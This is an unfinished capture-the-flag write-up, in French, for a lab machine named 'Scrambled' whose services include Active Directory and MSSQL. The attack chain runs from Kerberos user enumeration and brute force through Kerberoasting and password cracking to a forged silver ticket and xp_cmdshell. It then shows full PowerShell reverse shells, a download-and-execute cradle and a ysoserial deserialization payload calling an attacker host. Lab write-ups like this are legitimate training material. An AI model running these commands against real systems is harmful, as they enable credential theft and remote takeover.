\chapter{[TO FINISH] Scrambled}
\begin{itemize}
    \item {\bf keywords}: \gls{t:kerberos-silver-ticket},
        \gls{t:kerberos-enumeration}, \gls{t:sql-injection}

    \item {\bf Components}: \gls{kerberos}

    \item {\bf tools}: kerbrute, impacket
\end{itemize}


\section{Résumé}


\section{Details}

\subsubsection{nmap}
\begin{verbatim}
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-09 03:22:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-09-09T03:23:58+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-09-09T03:23:58+00:00; 0s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-09-09T03:19:26
|_Not valid after:  2052-09-09T03:19:26
|_ssl-date: 2022-09-09T03:23:58+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-09-09T03:23:58+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-09T03:23:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time:
|   date: 2022-09-09T03:23:21
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
\end{verbatim}

\subsection{DNS}
\begin{verbatim}
$ dig @10.10.11.168 any scrm.local
rien

$ dig @10.10.11.168 any scrm.local
rien
\end{verbatim}

\subsection{HTTP}

\begin{verbatim}
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ
    -u http://10.10.11.168 -H 'Host: FUZZ.scrm.local' -fs 2313
rien
\end{verbatim}

le site web ne donne rien si ce n'est des infos.
\begin{itemize}
    \item plus de NTLM
    \item on va pouvoir chercher des user avec passwd=login
    \item \verb+ksimpson+
    \item il y a un port d'ouvert en \verb+4411+
\end{itemize}

\subsection{userenum}

Validons que ksimpson existe
\begin{verbatim}
$ echo ksimpson > usernames.test
$ kerbrute userenum --dc 10.10.11.168 -d scrm.local ./usernames.test

2022/09/09 06:43:28 >  [+] VALID USERNAME:       ksimpson@scrm.local
\end{verbatim}

Peut on en trouver d'autres
\verb+/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt+

\begin{verbatim}
2022/09/09 06:49:20 >  [+] VALID USERNAME:       administrator@scrm.local
2022/09/09 06:50:46 >  [+] VALID USERNAME:       asmith@scrm.local
2022/09/09 06:52:46 >  [+] VALID USERNAME:       Administrator@scrm.local
2022/09/09 06:54:24 >  [+] VALID USERNAME:       jhall@scrm.local
2022/09/09 07:05:56 >  [+] VALID USERNAME:       sjenkins@scrm.local
2022/09/09 07:07:32 >  [+] VALID USERNAME:       khicks@scrm.local
2022/09/09 07:21:44 >  [+] VALID USERNAME:       Asmith@scrm.local
2022/09/09 07:48:46 >  [+] VALID USERNAME:       ASMITH@scrm.local
2022/09/09 07:55:19 >  [+] VALID USERNAME:       tstar@scrm.local
\end{verbatim}

trouvons ce qui ont reset leur password
\begin{verbatim}
$ kerbrute bruteforce --dc 10.10.11.168 -d scrm.local -


2022/09/09 07:01:35 >  Using KDC(s):
2022/09/09 07:01:35 >   10.10.11.168:88

ksimpson:ksimpson
2022/09/09 07:01:43 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
\end{verbatim}

\begin{verbatim}
$ kerbrute bruteforce -v --dc 10.10.11.168 -d scrm.local reseted.txt
\end{verbatim}


\subsection{port 4411}


\subsection{SMB}

\begin{verbatim}
$ smbclient.py scrm/ksimpson:ksimpson@dc1.scrm.local -dc-ip 10.10.11.168

[-] SMB SessionError: STATUS_NOT_SUPPORTED(The request is not supported.)
\end{verbatim}

il doit falloir un ticket à cause de \verb+plus de NTLM+

\begin{verbatim}
$ getTGT.py scrm/ksimpson:ksimpson -dc-ip 10.10.11.168
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Saving ticket in ksimpson.ccache


$ export KRB5CCNAME=ksimpson.ccache

$ smbclient.py scrm.local/ksimpson:ksimpson@dc1.scrm.local -k -dc-ip 10.10.11.168
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL

# use Public
\end{verbatim}

le pdf nous donne des infos :
\begin{verbatim}
When you log on or access network resources you will now be using Kerberos
authentication ... require you to use the full domain name (scrm.local) with your
username and any server names you access...

we have removed all access to the SQL service for everyone apart from network
administrators.
\end{verbatim}

Il y a plein de shares non accessibles sur lesquels il faudra revenir

Quoi qu'il en soit si l'on veut acceder à MSSQL il va falloir forger un silver
ticket

\subsection{Silver ticket}

Il faut trouver le SPN de MSSQL et trouver son NTHash
\begin{verbatim}

$ GetUserSPNs.py scrm.local/ksimpson:ksimpson  -k   -dc-ip dc1.scrm.local

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2022-09-09 05:19:24.336275
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2022-09-09 05:19:24.336275
\end{verbatim}

Récuperons les infos du service
\begin{verbatim}
$ GetUserSPNs.py scrm.local/ksimpson:ksimpson  -k  \
    -request -outputfile sqlsvc.hash  \
    -dc-ip dc1.scrm.local
\end{verbatim}

trouvons le mdp
\begin{verbatim}
$ john --wordlist=/usr/share/wordlists/passwor
ds/rockyou.txt sqlsvc.hash

$ john --show sqlsvc.hash
?:Pegasus60

1 password hash cracked, 0 left
\end{verbatim}

generation du NT hash pour le mdp trouvé avec 
\href{https://codebeautify.org/ntlm-hash-generator}{NTLM Hash
        Generator} (\verb+B999A16500B87D17EC7F2E2A68778F05+)


récupérons le SID du domaine
\begin{verbatim}
$ getPac.py -targetUser ksimpson scrm.local/ksimpson:ksimpson 
.. .
.. .
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
\end{verbatim}

generons le ticket:
\begin{verbatim}
$ ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn MSSQLSvc/scrm.local -user-id 500 Administrator
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
\end{verbatim}

\subsection{Mysql}

\begin{verbatim}
$ export KRB5CCNAME=silver_sql.ccache 

$ mssqlclient.py -k scrm.local 

[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
\end{verbatim}

cela ne marche pas en lancant en debug
\begin{verbatim}
$ mssqlclient.py -k scrm.local -debug


[+] Impacket Library Installation Path: /usr/lib/python3.10/site-packages/impacket
[*] Encryption required, switching to TLS
[+] Domain retrieved from CCache: SCRM.LOCAL
[+] Using Kerberos Cache: Administrator.ccache
[+] SPN MSSQLSVC/SCRM.SCRM.LOCAL:1433@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Searching target's instances to look for port number 1433
[+] SPN KRBTGT/SCRM.LOCAL@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for MSSQLSVC/SCRM.LOCAL@SCRM.LOCAL
[+] Using TGT from cache
[+] Username retrieved from CCache: Administrator
[+] Trying to connect to KDC at SCRM.LOCAL
[+] Server time (UTC): 2022-09-10 03:01:03
[+] Exception:
Traceback (most recent call last):
  File "/usr/bin/mssqlclient.py", line 172, in <module>
    res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey,
  File "/usr/lib/python3.10/site-packages/impacket/tds.py", line 808, in kerberosLogin
    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
  File "/usr/lib/python3.10/site-packages/impacket/krb5/kerberosv5.py", line 438, in getKerberosTGS
    r = sendReceive(message, domain, kdcHost)
  File "/usr/lib/python3.10/site-packages/impacket/krb5/kerberosv5.py", line 91, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
\end{verbatim}

on refait le TGS

\begin{verbatim}
$ ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn MSSQLSVC/scrm.scrm.local:1433 -user-id 500 Administrator
\end{verbatim}

et ca passe

\begin{verbatim}
SQL> select name from master.sys.databases
SQL> use ScrambledHR
SQL> select name from information_schema.tables
SQL> SELECT * from UserImport

MiscSvc             ScrambledEggs9900           scrm.local
\end{verbatim}


\begin{verbatim}
SQL> enable_xp_cmdshell
[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> exec xp_cmdshell 'whoami';
scrm\sqlsvc
\end{verbatim}

reverseshell using \url{https://www.revshells.com/} (select \verb+powershell #3 (Base64)+ with Encoding
\verb+None+)
\begin{verbatim}
ncat -lnvp 4444
SQL> xp_cmdshell powershell xp_cmdshell powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.3', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
[-] ERROR(DC1): Line 1: Incorrect syntax near '10.10'.
\end{verbatim}

on n'a pas acces aux shares par contre on confirme que \verb+MiscSvc+ existe.

\begin{verbatim}
$ cat shell.ps1

$client = New-Object System.Net.Sockets.TCPClient("10.10.16.3",4455);$stream = $
client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($byte
s, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEnc
oding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendb
ack2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCI
I).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flus
h()};$client.Close()


$ sudo python -m http.server 80
$ sudo  nc -lnvp 4455

$password = ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential("scrm\miscsvc", $password)

Invoke-Command -Computer dc1 -ScriptBlock { 
    IEX(New-Object Net.WebClient).downloadString("http://10.10.16.3/shell.ps1") 
    } -Credential $cred
\end{verbatim}

on trouve le user.txt

\begin{verbatim}

Re-enumeration!

So, it looks like MiscSVC has access to a few more SMB shares under C:\Shares. It looks like under IT we can find the EXE running on port 4411. Let's download them using Powercat, then it's time for a bit of decompilation...

Create a listener on your machine, then upload Powercat on the target and send over both the DLL and EXE.

Receiver

nc -l -p 4446 -q 1 > OUTPUT_FILE.EXE < /dev/null

Note: -q 1 = quit 1 second after file transfer.

Sender

Invoke-WebRequest -Uri "http://10.10.14.121:9090/powercat.ps1" -OutFile pc.ps1

powercat -c 10.10.XX.XX -p 4446 -i C:\Users\miscsvc\Documents\ScrambleLib.dll





Decompiling Time

Using DNSpy on a Windows VM we can decompile the EXE and the DLL that we found on the SMB share. Now we might be able to find out how to interact with the service on port 4411!

Having dug through both the EXE and DLL, the DLL seems to contain a few interesting functions. Below is what the `uploadOrder` does, and it seems to involve some Deserialisation using .NET's BinaryFormatter.

After doing some research, it looks like we can take advantage of this by using ysoserial to generate a base64 shell, which gets executed when deserialised by the Binary Formatter.


Y So Serial? (.exe)

    Let's take advantage of that deserialization using ysoserial
    (https://github.com/frohoff/ysoserial) and get our
    last reverse shell.

    ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c
    ``powershell IEX(New-Object
    System.Net.WebClient).DownloadString('http://10.10.XX.XX:8000/Invoke-TcpReverseShell.ps1')''


Take the output from this, and then connect to Port 4411. We can then execute this base64 shell like this:

UPLOAD_ORDER;base64code//////

Voila! We should have another reverse shell as Administrator! At long last, go ahead and dig the root.txt out! 
\end{verbatim}

\section{Theorie}


